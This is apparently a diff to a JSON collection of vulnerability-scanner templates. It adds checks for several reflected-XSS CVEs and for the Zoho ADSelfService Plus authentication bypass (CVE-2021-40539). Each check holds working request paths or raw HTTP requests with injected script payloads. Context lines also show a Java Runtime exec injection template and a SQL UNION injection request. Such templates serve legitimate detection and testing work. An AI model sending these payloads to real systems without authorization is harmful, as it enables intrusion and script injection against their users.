@@ -8027,6 +8027,57 @@
       ]
     },
     {
+      "id": "CVE-2016-8527",
+      "info": {
+        "author": "pikpikcu",
+        "classification": {
+          "cve-id": "CVE-2016-8527",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "Aruba Airwave all versions up to, but not including, 8.2.3.1 is vulnerable to a reflected cross-site scripting (XSS).",
+        "name": "Aruba Airwave - (XSS)",
+        "reference": [
+          "https://www.exploit-db.com/exploits/41482",
+          "https://nvd.nist.gov/vuln/detail/CVE-2016-8527"
+        ],
+        "severity": "medium",
+        "tags": "cves,cve2016,aruba,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/visualrf/group_list.xml?aps=1&start=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&end=500&match"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2017-1000028",
       "info": {
         "author": "pikpikcu",
@@ -11359,6 +11410,58 @@
           },
           "raw": [
             "POST /account HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nContent-Type: application/x-www-form-urlencoded\n\nname[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('{{url_encode('§command§')}}')]=nuclei\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-12998",
+      "info": {
+        "author": "pikpikcu",
+        "classification": {
+          "cve-id": "CVE-2018-12998",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "reflected Cross-site scripting (XSS) vulnerability in Zoho ManageEngine Netflow Analyzer before build 123137, Network Configuration Manager before build 123128, OpManager before build 123148, OpUtils before build 123161, and Firewall Analyzer before build 123147 allows remote attackers to inject arbitrary web script or HTML via the parameter 'operation' to /servlet/com.adventnet.me.opmanager.servlet.FailOverHelperServlet.",
+        "name": "Zoho manageengine Arbitrary Reflected XSS",
+        "reference": [
+          "https://github.com/unh3x/just4cve/issues/10",
+          "http://packetstormsecurity.com/files/148635/Zoho-ManageEngine-13-13790-build-XSS-File-Read-File-Deletion.html",
+          "https://nvd.nist.gov/vuln/detail/CVE-2018-12998"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2018,zoho,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/servlet/com.adventnet.me.opmanager.servlet.FailOverHelperServlet?operation=11111111%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -15050,6 +15153,50 @@
       ]
     },
     {
+      "id": "CVE-2019-13392",
+      "info": {
+        "author": "pikpikcu",
+        "classification": {
+          "cve-id": "CVE-2019-13392",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "reflected Cross-Site Scripting (XSS) vulnerability in MindPalette NateMail 3.0.15 allows an attacker to execute remote JavaScript in a victim's browser via a specially crafted POST request. The application will reflect the recipient value if it is not in the NateMail recipient array. Note that this array is keyed via integers by default, so any string input will be invalid.",
+        "name": "MindPalette NateMail 3.0.15 - (XSS)",
+        "reference": [
+          "https://www.doyler.net/security-not-included/natemail-vulnerabilities",
+          "https://nvd.nist.gov/vuln/detail/CVE-2019-13392"
+        ],
+        "severity": "medium",
+        "tags": "cves,cve2019,natemail,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /NateMail.php HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\n\nrecipient=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2019-13462",
       "info": {
         "author": "divya_mudgal",
@@ -17716,6 +17863,56 @@
           ],
           "raw": [
             "POST /cgi-bin/supportInstaller HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: identity\nUser-Agent: MSIE\nContent-Type: application/x-www-form-urlencoded\n\nfromEmailInvite=1&customerTID=unpossible'+UNION+SELECT+0,0,0,11132*379123,0,0,0,0--\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2019-7543",
+      "info": {
+        "author": "pikpikcu",
+        "classification": {
+          "cve-id": "CVE-2019-7543",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "KindEditor 4.1.11, the php/demo.php content1 parameter has a reflected Cross-site Scripting (XSS) vulnerability.",
+        "name": "KindEditor 4.1.11, the php/demo.php - (XSS)",
+        "reference": [
+          "https://github.com/0xUhaw/CVE-Bins/tree/master/KindEditor",
+          "https://nvd.nist.gov/vuln/detail/CVE-2019-7543"
+        ],
+        "severity": "medium",
+        "tags": "cves,cve2019,kindeditor,xss"
+      },
+      "requests": [
+        {
+          "body": "content1=</script><script>alert(document.domain)</script>&button=%E6%8F%90%E4%BA%A4%E5%86%85%E5%AE%B9",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/kindeditor/php/demo.php",
+            "{{BaseURL}}/php/demo.php"
           ]
         }
       ]
@@ -24097,9 +24294,15 @@
       ]
     },
     {
-      "id": "CVE 2020-6171",
+      "id": "CVE-2020-6171",
       "info": {
         "author": "pikpikcu",
+        "classification": {
+          "cve-id": "CVE-2020-6171",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
         "description": "A cross-site scripting (XSS) vulnerability in the index page of the CLink Office 2.0 management console allows remote attackers to inject arbitrary web script or HTML via the lang parameter.\n",
         "name": "CLink Office v2 XSS",
         "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-6171",
@@ -27729,6 +27932,57 @@
       ]
     },
     {
+      "id": "CVE-2021-24364",
+      "info": {
+        "author": "pikpikcu",
+        "classification": {
+          "cve-id": "CVE-2021-24364",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "The Jannah WordPress theme before 5.4.4 did not properly sanitize the options JSON parameter in its tie_get_user_weather AJAX action before outputting it back in the page, leading to a Reflected Cross-Site Scripting (XSS) vulnerability.",
+        "name": "Jannah < 5.4.4 (XSS)",
+        "reference": [
+          "https://wpscan.com/vulnerability/1d53fbe5-a879-42ca-a9d3-768a80018382",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-24364"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2021,wordpress,xss,wp-theme"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-admin/admin-ajax.php?action=tie_get_user_weather&options=%7B%27location%27%3A%27Cairo%27%2C%27units%27%3A%27C%27%2C%27forecast_days%27%3A%275%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ecustom_name%27%3A%27Cairo%27%2C%27animated%27%3A%27true%27%7D"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-24387",
       "info": {
         "author": "suman_kar",
@@ -27848,6 +28102,56 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/community/?foro=signin&redirect_to=https://example.com/"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-24407",
+      "info": {
+        "author": "pikpikcu",
+        "classification": {
+          "cve-id": "CVE-2021-24407",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "The Jannah WordPress theme before 5.4.5 did not properly sanitize the 'query' POST parameter in its tie_ajax_search AJAX action, leading to a Reflected Cross-site Scripting (XSS) vulnerability.",
+        "name": "Jannah < 5.4.5 - Reflected Cross-Site Scripting (XSS)",
+        "reference": [
+          "https://wpscan.com/vulnerability/fba9f010-1202-4eea-a6f5-78865c084153",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-24407"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2021,wordpress,xss,wp-theme"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\n\naction=tie_ajax_search&query[]=</script><script>alert(document.domain)</script>\n"
           ]
         }
       ]
@@ -31000,6 +31304,58 @@
       ]
     },
     {
+      "id": "CVE-2021-35265",
+      "info": {
+        "author": "pikpikcu",
+        "classification": {
+          "cve-id": "CVE-2021-35265",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "Reflected cross-site scripting (XSS) vulnerability in MaxSite CMS before V106 via product/page/* allows remote attackers to inject arbitrary web script to a page.",
+        "name": "MaxSite CMS XSS",
+        "reference": [
+          "https://github.com/maxsite/cms/issues/414#issue-726249183",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-35265"
+        ],
+        "severity": "medium",
+        "tags": "cves,cve2021,maxsite,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "{{BaseURL}}/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021–35336",
       "info": {
         "author": "Pratik Khalane",
@@ -31335,6 +31691,61 @@
       ]
     },
     {
+      "id": "CVE-2021-37833",
+      "info": {
+        "author": "pikpikcu",
+        "classification": {
+          "cve-id": "CVE-2021-37833",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "Reflected cross-site scripting (XSS) vulnerability exists in multiple pages in version 3.0.2 of the Hotel Druid application that allows for arbitrary execution of JavaScript commands.",
+        "name": "Hotel Druid 3.0.2 XSS",
+        "reference": [
+          "https://github.com/dievus/CVE-2021-37833",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-37833"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2021,hoteldruid,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/visualizza_tabelle.php?anno=2021&tipo_tabella=prenotazioni&sel_tab_prenota=tutte&wo03b%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ew5px3=1",
+            "{{BaseURL}}/storia_soldi.php?piu17%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ee3esq=1",
+            "{{BaseURL}}/tabella.php?jkuh3%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Eyql8b=1",
+            "{{BaseURL}}/crea_modelli.php?anno=2021&id_sessione=&fonte_dati_conn=attuali&T_PHPR_DB_TYPE=postgresql&T_PHPR_DB_NAME=%C2%9E%C3%A9e&T_PHPR_DB_HOST=localhost&T_PHPR_DB_PORT=5432&T_PHPR_DB_USER=%C2%9E%C3%A9e&T_PHPR_DB_PASS=%C2%9E%C3%A9e&T_PHPR_LOAD_EXT=NO&T_PHPR_TAB_PRE=%C2%9E%C3%A9e&anno_modello=2021&lingua_modello=en&cambia_frasi=SIipq85%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ef9xkbujgt24&form_availability_calendar_template=1"
+          ],
+          "stop-at-first-match": true
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-38702",
       "info": {
         "author": "geeknik",
@@ -31427,6 +31838,49 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-40539",
+      "info": {
+        "author": "daffainfo",
+        "classification": {
+          "cve-id": "CVE-2021-40539",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "cvss-score": 9.8,
+          "cwe-id": "CWE-287"
+        },
+        "description": "Zoho ManageEngine ADSelfService Plus version 6113 and prior is vulnerable to REST API authentication bypass with resultant remote code execution.",
+        "name": "Zoho ManageEngine ADSelfService Plus version 6113 Unauthenticated RCE",
+        "reference": [
+          "https://attackerkb.com/topics/DMSNq5zgcW/cve-2021-40539/rapid7-analysis",
+          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40539"
+        ],
+        "severity": "critical",
+        "tags": "cve,cve2021,rce,zoho"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script type=\"text/javascript\">var d = new Date();window.parent.$(\"#mobLogo\").attr(\"src\",\"/temp/tempMobPreview.jpeg?\"+d.getTime());window.parent.$(\"#tabLogo\").attr(\"src\",\"/temp/tempMobPreview.jpeg?\"+d.getTime());</script>"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /./RestAPI/LogonCustomization HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 27\n\nmethodToCall=previewMobLogo\n"
           ]
         }
       ]
